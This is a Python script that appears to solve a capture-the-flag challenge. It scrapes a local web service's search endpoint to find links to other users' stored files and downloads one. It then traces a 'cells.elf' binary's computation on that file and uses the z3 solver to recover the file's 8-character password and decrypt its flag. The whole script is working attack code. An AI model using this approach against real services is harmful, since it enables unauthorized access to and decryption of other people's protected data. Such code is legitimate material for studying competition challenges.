import requests,string,random,re,os,subprocess,time,z3


def id_gen(size=6, chars=string.ascii_uppercase+string.ascii_lowercase+ string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

sess2 = requests.Session()
refs = set([])
url = "http://127.0.0.1:5000/"

for i in range(10):
    ll = id_gen(1)
    resp = sess2.get(url+"search",params=dict(template=ll))
    rr = re.findall(r'href\="\/data\/([A-Za-z0-9]+)/([A-Za-z0-9\.]+)"',resp.text)
    for r in rr:
        refs.add((r[0],r[1]))

if not os.path.isdir("tmp"):
    os. mkdir("tmp")
refs = list(refs)

(login,filename) = refs[0]
local_filename = os.path.join("tmp",login+"_"+filename)

print(url+"data/"+login+"/"+filename)
with requests.get(url+"data/"+login+"/"+filename, stream=True) as r:
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=8192): 
            f.write(chunk)

proc = subprocess.Popen(["./cells.elf","execute",local_filename,"00000000","1"],stdout=subprocess.PIPE)
res = proc.communicate()

#print("./cells.elf","execute",local_filename,"00000000","3")
proc1 = subprocess.Popen(["./cells.elf","execute",local_filename,"00000000","3"],stdout=subprocess.PIPE)
res1 = proc1.communicate()

cmds_f = res1[0].split(b"\n")[1::1]
cmds_f2=[]
for i in range(len(cmds_f)):
    if b" 0)" in cmds_f[-i-1]:
        break
    cmds_f2.append(cmds_f[-i-1])
# print(cmds_f2)
cmds_f2=cmds_f2[::-1]
cmds = res[0].split(b"\n")[1::2]
state=0
compute = []
for cmd in cmds:
    if state == 0:
        if b"skip 84 remove" in cmd:
            state = 1
            continue
    if state == 1:
        res = re.findall(r'(\w+)',cmd.decode())
        compute.append(res[1:]+[res[0]])
        if "reload" in cmd.decode():
            compute[-1] = compute[-1][:-1]
            break

#print("!",compute)
#print(int(compute[0][-1]) + len(compute)+8)
flag_enc=[]
#print(cmds_f2)
for i in range(len(cmds_f2)):
    if b"000030" in cmds_f2[i]:
        #print(cmds_f2[i+8:i+8+32+1+8])
        for j in range(32+1+8):
            rres = re.findall(r'^\s([0-9a-f]+)\s',cmds_f2[i+8+j].decode())
            if rres[0][0] == 'f':
                rres[0]="ff"+rres[0]
                flag_enc.append(-1*(0xFFFFFFFF-int(rres[0],16))-1)
            else:
                flag_enc.append(int(rres[0],16))
            
        break;
#print(flag_enc)
pos = 0
for cmd in compute:
    cmd[1] = int(cmd[1])
    cmd[2] = int(cmd[2])
    cmd[1] += pos - len(compute)
    cmd[2] += pos - len(compute)
    pos +=1
#print(compute)

solv = z3.Solver()
password_z3 = []
for i in range(8):
    password_z3.append(z3.BitVec('p%d' % i,7))
    solv.add(z3.Or(\
                z3.And(password_z3[-1] >= ord('0'),password_z3[-1] <= ord('9')),\
                z3.And(password_z3[-1] >= ord('A'),password_z3[-1] <= ord('Z')),\
                z3.And(password_z3[-1] >= ord('a'),password_z3[-1] <= ord('z'))))
cells_z3=[]
ops = {"xor":"^","mul":"*","sub":"-","add":"+"}
for i in range(len(compute)):
    operation = ops[compute[i][0]]
    cells_z3.append(eval("password_z3[%d] %s password_z3[%d]" % (compute[i][1],operation,compute[i][2])))

#print(cells_z3)

flag2_z3 = []
for i in range(32+1+8):
	flag2_z3.append(flag_enc[i] ^ cells_z3[i])

#print(solv,"!!!",len(flag2_z3))
for i in range(len(flag2_z3)):
    if i < 31:
        solv.add(\
            z3.Or(\
                    z3.And(flag2_z3[i] >= ord('0'),flag2_z3[i] <= ord('9')),\
                    z3.And(flag2_z3[i] >= ord('A'),flag2_z3[i] <= ord('Z')),\
                    z3.And(flag2_z3[i] >= ord('a'),flag2_z3[i] <= ord('z'))))
    elif i == 31:
        solv.add(flag2_z3[i] == ord('='))
    elif i == 32:
        solv.add(flag2_z3[i] == ord(','))
    elif i > 32:
        solv.add(\
            z3.Or(\
                z3.And(flag2_z3[i] >= ord('0'),flag2_z3[i] <= ord('9')),\
                z3.And(flag2_z3[i] >= ord('a'),flag2_z3[i] <= ord('h'))\
                ))

#print(solv)
ress=solv.check()
#print(ress)
pw = ""
for i in range(8):
    #print(chr(solv.model()[password_z3[i]].as_long()))
    pw +=chr(solv.model()[password_z3[i]].as_long())
    
print(pw)
proc2 = subprocess.Popen(["./cells.elf","execute",local_filename,pw,"0"],stdout=subprocess.PIPE)
res2 = proc2.communicate()
print(res2)
